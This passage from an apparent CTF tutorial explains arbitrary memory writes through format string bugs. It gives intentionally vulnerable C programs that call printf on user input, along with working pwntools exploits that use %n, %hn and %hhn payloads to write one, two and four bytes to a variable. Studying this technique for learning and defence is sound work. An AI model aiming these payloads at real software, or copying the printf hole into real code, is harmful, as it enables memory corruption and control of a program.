 ► 0x7f15d681f947 <__strlen_avx2+71>     vpcmpeqb ymm1, ymm0, ymmword ptr [rdi]
```

```gdb
pwndbg> p/x $rdi
```

![alt text](/static/ctf-techs/image-10.png)

This confirms what we said earlier. Now, if we change the payload to reference `7th` value, instead of `6th`, we get the flag.

Using these exact same techniques, we can debug write-fsbs.

## Arbitrary Write

Using format strings, we can write data, whether it be to an arbitrary address or the Global Offset Table. This gives us a very strong primitive allowing us to directly control the execution of the program.

In order to write data to an address, we use the `%n` format specifier. What `%n` does is write the numbers of bytes already printed on the stream to an address specified. The basic example of this could be, consider that the first element is: `0x404080`. So, recalling how we read the value from an address : `specifier+pack(address)`, something similar to that i.e. we will firstly specify the number of bytes we want to print and then the address. Keeping in mind, we first have to identify the [start offset](#identifying-the-format-string-start-offset) of the format string.

### To an address

Using an FSB, we can write any data to any specified address. The writes can of multiple types/bytes and totally depends on the data that we want to write and the location we're going to write to. Let's firstly take a look at the specifiers and how many bytes can each specifier write

| Specifier | No. of Bytes that can be written |
| --- | --- |
| hhn | 1-byte |
| hn | 2-bytes |
| n | 4-bytes |
| lln | 8-bytes |
| ln | 8-bytes|

> *NOTE*: There isn't any difference between ln and lln; they're practically the same.

Before moving to writing, there is one thing that we must understand about writing data using format strings, the `%n` specifier simply takes in the number of bytes written/printed so far, so therefore, if we were to write a large amount of data using a single printf, our stdout will be clobbered. We will take a look at this when writing four, or eight bytes of data to a location.

#### Writing One Byte

For this example, let's consider the following source code:

```c:fsb-write-one-byte.c
// gcc -o fsb-write-one-byte fsb-write-one-byte.c -w -no-pie

#include <stdio.h>
#include <stdlib.h>

int secret = 0;

int main() {

    char buffer[0x100];

    printf("=> secret @ %p\n", &secret);
    printf("What is your name? ");
    fgets(buffer, 0x100, stdin);

    printf(buffer);

    if(secret == 0x37) {
        printf("Well done!\n");
        return 0;
    }
    printf("Nope!\n");
    return 1;
}
```

In this code, the first thing that we need to idenitfy is the [start offset](#identifying-the-format-string-start-offset). For generic purposes, I will use a function that I wrote a while back. You can find this on my [gist](https://gist.github.com/TheFlash2k/2ee4650c3fc850caceb558ef82fa9bd6)

```py:fmt-generator.py
def create_fmt(start: int, end: int = 0, atleast: int = 10, max_len: int = -1, with_index: bool = False, specifier: str = "p", seperator: str = '|') -> bytes:
    end = start+atleast if end == 0 else end
    fmt = "{seperator}%{i}${specifier}" if not with_index else "{seperator}{i}=%{i}${specifier}"
    rt = ""
    for i in range(start, end+1): rt += fmt.format(i=i, specifier=specifier, seperator=seperator)
    ''' Making sure we always get a valid fmt in the max_len range '''
    if max_len <= 0: return rt.encode()
    rt = seperator.join(rt[:max_len].split(seperator)[:-1]) if rt[:max_len][-1] != specifier else rt[:max_len]
    return rt.encode()
```

Now, here I am going to use my template, along with this function and we'll extract the address of secret as well:

```py:exploit-fsb-write-one-byte.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
exe = "./fsb-write-one-byte"
elf = context.binary = ELF(exe)
io = process()
if args.GDB: gdb.attach(io, "b *main")

def create_fmt(start: int, end: int = 0, atleast: int = 10, max_len: int = -1, with_index: bool = False, specifier: str = "p", seperator: str = '|') -> bytes:
    end = start+atleast if end == 0 else end
    fmt = "{seperator}%{i}${specifier}" if not with_index else "{seperator}{i}=%{i}${specifier}"
    rt = ""
    for i in range(start, end+1): rt += fmt.format(i=i, specifier=specifier, seperator=seperator)
    ''' Making sure we always get a valid fmt in the max_len range '''
    if max_len <= 0: return rt.encode()
    rt = seperator.join(rt[:max_len].split(seperator)[:-1]) if rt[:max_len][-1] != specifier else rt[:max_len]
    return rt.encode()

io.recvuntil(b"@ ")
secret = int(io.recvline(), 16)
info("secret @ %#x" % secret)

payload = create_fmt(1, 15, with_index=True)
io.sendline(b"AAAAAAAA" + payload)

io.interactive()
```

```txt:stdout
What is your name? AAAAAAAA|1=0x22f36b1|2=(nil)|3=0x22f372e|4=0x7ffe6bc83bb0|5=0x7c|6=0x4141414141414141|7=0x7c702431253d317c|8=0x337c702432253d32|9=0x3d347c702433253d|10=0x253d357c70243425|11=0x36253d367c702435|12=0x2437253d377c7024|13=0x702438253d387c70|14=0x7c702439253d397c|15=0x70243031253d3031
Nope!
```

Now, we can notice that `6` is the starting index of our format string. The next thing I'll identify is the offset from the main where I'm going to break to identify the data being passed. You can refer to the [Debugging FSB](#debugging-a-fsb) guide.

![alt text](/static/ctf-techs/image-19.png)

Now we know that we can set the breakpoint at `main+113`. Now, in exploit, we can update this, and can also get rid of the `create_fmt` function as we have identified the start of our format string i.e. `6`. So, Now we know three things:

- Start of the format string.
- Address to write to.
- Data to write to address.

So, recalling the specifiers, we know that `%hhn` can be used to write one byte to an address. So, now, in order to write data to an address, we must write the number of bytes of data to write to the address first. We know that we have to write `0x37`. `0x37` in decimal is 55. So, we must first write 55 bytes onto the stdout and then call the `%hhn` to write to the specified address. Our payload will look something like this:

```py:payload
payload = b"%55c" # this will only write the 0x37 bytes
payload += b"%6$hnn" # Writing number of bytes printed so far to the address specified
payload += p64(secret)
```

Now, let's try and send this payload to the program and analyze in GDB

![alt text](/static/ctf-techs/image-20.png)

Analyzing the `rsp`, we can see that the index that we consider `6th` or the `R8` register contains `0x6824362563353525` and the next index, which would technically be `7th`, contains `0x00000040405c6e6e`, meaning that even if we refer `7th` from our format string, the program would crash because `0x00000040405c6e6e` would be an invalid address.

![alt text](/static/ctf-techs/image-21.png)

Therefore, in order to fix this, we'll add padding. i.e. change `0x00000040405c6e6e` to `0x7f7f7f7f7f7f6e6e` and then our address would exist on `8th` index, the changes to the payload would be as follows:

```py:payload
payload = b"%55c" # this will only write the 0x37 bytes
payload += b"%8$hnn||||||" # Writing number of bytes printed so far to the address specified
payload += p64(secret)
```

Now, analyzing in GDB:

![alt text](/static/ctf-techs/image-22.png)

Now, we can see that the `8th` index now contains `0x000000000040405c` which is the address of `secret`. Let's continue and check the output:

![alt text](/static/ctf-techs/image-23.png)

Well, we easily wrote these two bytes without any issue and got the `Well done!` message. The final exploit that we used became:

```py:exploit-fsb-write-one-byte.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
exe = "./fsb-write-one-byte"
elf = context.binary = ELF(exe)
io = process()
if args.GDB: gdb.attach(io, "b *main+113")

io.recvuntil(b"@ ")
secret = int(io.recvline(), 16)
info("secret @ %#x" % secret)

payload = b"%55c" # this will only write the 0x37 bytes
payload += b"%8$hnn||||||" # Writing number of bytes printed so far to the address specified
payload += p64(secret)

io.sendline(payload)

io.interactive()
```

> One small shortcut of identifying the number of bytes and offset manually without gdb is, calculate the number of bytes of data so far. Consider this: `%55c%6$hnn`. Now, this corresponds to a total of `10` bytes. We know that in `64-bit`, each address is `8-bytes` long. So, we must pad it to so that it becomes a multiple of `8`, therefore, `16-10` i.e. `6-bytes` of padding will added. Also, the starting index was `6`, we wrote `16-bytes`, `16/8` is 2, therefore, we'll add `2` to `6` and then the offset will become `8`.

##### Bytes-Gimmick

Now, one question that I had, what would happen, if I used `%n` instead of `%hhn` or even `%hn` to write only one byte? Well, the answer is the program would behave the same way (obviously we'll have to fix the padding and offset), but since we're only printing `0x37` bytes to stdout, no matter the specifier, it would write the bytes to the address passed. However, let's consider the following:

```hex
0x7f2fab192a0 -> 0xdeadbeefdeadbeef
```

Now, `0x7f2fab192a0` contains the value `0xdeadbeefdeadbeef`. Let's say, we're using `%hhn` to write `0x69` to the address. So, our value will become `0xdeadbeefdeadbe69`. Now, if we were using `%hn`, and we were to write only `0x69`, then the value will become: `0xdeadbeefdead0069`, that is because `%hn` would write 2-bytes, even though we printed only one byte. Same is the scenario for `%n`. If we were to write `0x69` using `%n`, the value will become, `0xdeadbeef00000069`. And lastly, same is the case when we're using `%ln` or `%lln`. Writing `0x69` using `%lln` will be: `0x0000000000000069`.

The `%lln` is a powerful gimmick when overwriting an already existing value on the GOT as the value already on the GOT will be 8-bytes long and our `win` function in most cases will be 3-4 bytes long, so we'll firstly write a single byte using `%lln` and then write the other bytes easily. We'll take a detailed look into this in [GOT Overwrite section](#overwriting-entries-on-the-global-offset-table).

#### Writing Two Bytes

Similar to the [one-byte](#writing-one-byte) section, we'll use the following (slightly modified) source code:

```c:fsb-write-two-bytes.c
// gcc -o fsb-write-two-bytes fsb-write-two-bytes.c -w -no-pie

#include <stdio.h>
#include <stdlib.h>

int secret = 0;

int main() {

    char buffer[0x100];

    printf("=> secret @ %p\n", &secret);
    printf("What is your name? ");
    fgets(buffer, 0x100, stdin);

    printf(buffer);

    if(secret == 0x1337) {
        printf("Well done!\n");
        return 0;
    }
    printf("Nope!\n");
    return 1;
}
```

Now once again, we'll find the start of the format string. I won't go into details. The offset for this is the same as the one before i.e. `6`. Now, since we're writing two bytes, there are two ways to do so:

- Writing one-byte at a time
- Writing two-bytes

Now, let's firstly start with the latter. We'll try and write two bytes at a time. We know that, using `%hn`, we can write two bytes, so, converting `0x1337` to decimal, we get `4919`, meaning that we have to write `0x1337` bytes to the stdout. Let's try the following payload:

```py:payload
payload = b"%4919c"
payload += b"%6$hn"
payload += p64(secret)
```

Now, let's debug this first and find the padding necessary:

![alt text](/static/ctf-techs/image-24.png)

We can see that we need `5` bytes of padding, so therefore, we add that, and then since a total of `16` bytes are written so, `8` will be the offset of our address therefore, our final payload becomes:

```py:payload
payload = b"%4919c"
payload += b"%8$hn|||||"
payload += p64(secret)
```

![alt text](/static/ctf-techs/image-25.png)

The exploit for this becomes:

```py:exploit-fsb-write-two-bytes-0x0.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
exe = "./fsb-write-two-bytes"
elf = context.binary = ELF(exe)
io = process()
if args.GDB: gdb.attach(io, "b *main+113")

io.recvuntil(b"@ ")
secret = int(io.recvline(), 16)
info("secret @ %#x" % secret)

payload = b"%4919c"
payload += b"%8$hn|||||"
payload += p64(secret)

io.sendline(payload)

io.interactive()
```

##### Writing two-bytes; one at a time

Now, we can see that the stdout was clobbered with tons of whitespaces. In a two-byte scenario, this may work, however, if we're trying to write more than two bytes at a time, handling such cases will render the stdout with tons and tons of whitespaces. So, we must also know how to write data to an address, byte-by-byte.

Now, recalling the writing [one-byte](#writing-one-byte) section, we know that we can use `%hhn` to write one-byte. However, one thing you should understand, `%hhn` once called writes `N` bytes, and on the next call, if you don't specify any-bytes, it would simply print `N+1` bytes to the stdout, and if a number was specified; say K, then, `K+N` bytes will be printed, but since one byte can be in the range `0-255`, we can simply limit this, and wrap the result around. So, let's say, if we were to print `0x1337`, we'd first write `0x37`, then, if we were to write `0x13`, we'd do something like this: `((0x13-0x37) % 256)`, this will always give us the number of bytes that we need to write `0x13`. For this, I have written a simple lambda:

```py
diff_hhn = lambda i, j: ((i - j) % 256)
```

Another thing that we should know, let's say, `secret=0x404015` and we want to write `0x1337` to this address. What we need to do is, we'll write `0x37` to `0x404015` and `0x13` to `0x404016`, so that our data is properly written to the specified location that we want to.

Now, enough with the theory, the payload for this would look something like this:

```py:payload
start = 6
payload = f"%{0x37}c%{start}$hhn".encode()
payload += f"%{diff_hhn(0x13, 0x37)}c%{start+1}$hhn".encode()

payload += p64(secret)
payload += p64(secret+1)
```

Now, we need to identify two things here to make sure that our payload works fine:

1. Is the start-offset correct?
2. How many paddings do we need?

Okay, firstly, for the offset, let's run the exploit we've written so far in GDB.

![alt text](/static/ctf-techs/image-26.png)

Let's lay down the offsets as:

```hex
6: 0x7ffdab7c3200: 0x6824362563353525
7: 0x7ffdab7c3208: 0x2563303232256e68
8: 0x7ffdab7c3210: 0x40405c6e68682437
```

Now, We need to add `3-bytes` of padding so that `0x40405c` goes down to `9th` index. Now, when adding `3-bytes` and start becomes `9`, when `start+1` is 10, then 2-bytes are written, and when `3-bytes` padding is adding, the following occurs:

```hex
6: 0x7ffdab7c3200: 0x6824392563353525
7: 0x7ffdab7c3208: 0x2563303232256e68
8: 0x7ffdab7c3210: 0x7c7c6e6868243031
9: 0x7ffdab7c3218: 0x0000000040405c7c
```

So, to fix this, instead of three, we'll use `2-bytes` as padding. Therefore, the final exploit becomes:

```py:exploit-fsb-write-two-bytes-0x1.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
exe = "./fsb-write-two-bytes"
elf = context.binary = ELF(exe)
io = process()
if args.GDB: gdb.attach(io, "b *main+113")

diff_hhn = lambda i, j: ((i - j) % 256)

io.recvuntil(b"@ ")
secret = int(io.recvline(), 16)
info("secret @ %#x" % secret)

start = 9
payload = f"%{0x37}c%{start}$hhn".encode()
payload += f"%{diff_hhn(0x13, 0x37)}c%{start+1}$hhn".encode()
payload += b"||"

payload += p64(secret)
payload += p64(secret+1)

io.sendline(payload)

io.interactive()
```

#### Writing Four Bytes

Similar to [two bytes](#writing-two-bytes), we can write 4-bytes to a memory address using three different methods

- Four-Bytes at a time
- Two-Bytes at a time
- One-Byte at a time

Now, for this example, let's consider the following source code:

```c:fsb-write-four-bytes.c
// gcc -o fsb-write-four-bytes fsb-write-four-bytes.c -w -no-pie

#include <stdio.h>
#include <stdlib.h>

int secret = 0;

int main() {

    char buffer[0x100];

    printf("=> secret @ %p\n", &secret);
    printf("What is your name? ");
    fgets(buffer, 0x100, stdin);

    printf(buffer);

    if(secret == 0xdeadbeef) {
        printf("\n[*] Well done!\n");
        return 0;
    }
    printf("Nope! You wrote %d\n", secret);
    return 1;
}

```

Now, we'll firstly start off by writing `4-bytes` of data directly. `0xdeadbeef` becomes `3735928559`. Now, one thing, if we do `%3735928559c`, it will write `3735928559` bytes to the stdout, making it completely useless until all the bytes have been printed. This technique is often considered most useless as it will write so many bytes to the stdout and takes a long time to do so as well that we'll just skip it, however, if you still want to try, we'll make use of `%n` to write it. For sake of understanding, I'll only provide a working exploit with padding and everything so that we can understand it easily.

```py:exploit-fsb-write-four-bytes-0x0.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
exe = "./fsb-write-four-bytes"
elf = context.binary = ELF(exe)
io = process()
if args.GDB: gdb.attach(io, "b *main+113")

io.recvuntil(b"@ ")
secret = int(io.recvline(), 16)
info("secret @ %#x" % secret)

payload = b"%3735928559c%9$n||||||||"
payload += p64(secret)
io.sendline(payload)
io.interactive()
```

Now, this exploit will print `3735928559` whitespaces, which will take a long time, so we often just skip this. Let's focus on, how we can write data 2 bytes at a time, the answer is pretty simple. The way we wrote `1-byte` at a time, we made a helper lambda called `diff_hhn`, similar for this, we made another helper called `diff_hn`, which looks like this:

```py
diff_hn = lambda i, j: ((i - j) % 65536) # (0xFFFF+1)
```

Now, instead of writing `one-byte` at a time as we did [before](#writing-two-bytes-one-at-a-time), we'll write two-bytes a time using `%hn` specifier and we'll use the `diff_hn` lambda function to automatically calculate the number of bytes that we'd need to write. The final exploit would look something like this:

```py:exploit-fsb-write-four-bytes-0x1.py
#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
exe = "./fsb-write-four-bytes"
elf = context.binary = ELF(exe)
io = process()
if args.GDB: gdb.attach(io, "b *main+113")

io.recvuntil(b"@ ")
secret = int(io.recvline(), 16)
info("secret @ %#x" % secret)

diff_hn = lambda i, j: ((i - j) % 65536) # (0xFFFF+1)

start = 9
payload = f"%{0xbeef}c%{start}$hn".encode()
payload += f"%{diff_hn(0xdead,0xbeef)}c%{start+1}$hn".encode()
payload += p64(secret)
payload += p64(secret+2)

print(f"[*] Payload ({len(payload)=}) {payload}")

io.sendline(payload)
io.interactive()
```

Now, if we run this program, we'll see far less output and we can see that it won't take that much long to print all the bytes to the stdout; even though these still are many bytes.

![alt text](/static/ctf-techs/image-27.png)

We can see that these still are **QUITE** a lot of bytes. So, 

#### Writing Eight Bytes

### Copy Memory

### Overwriting Entries on the Global Offset Table

### Writing a ROP Chain using FSB

## Pwntools and other tools
